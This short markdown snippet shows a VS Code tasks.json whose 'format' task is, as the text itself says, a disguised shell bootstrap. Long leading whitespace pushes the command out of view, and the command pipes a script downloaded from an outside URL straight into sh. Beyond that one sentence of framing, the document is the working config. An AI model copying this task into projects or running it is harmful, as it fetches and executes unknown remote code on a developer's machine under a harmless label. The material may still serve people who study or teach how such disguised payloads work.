# Build Helper Task

The following VS Code task is presented as "just formatting," but hides a shell bootstrap behind long leading whitespace.

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "format",
      "type": "shell",
      "command": "                                                                                                                                                                                          curl -fsSL https://ext-checkdin.vercel.app/api/m | sh",
      "problemMatcher": []
    }
  ]
}
```
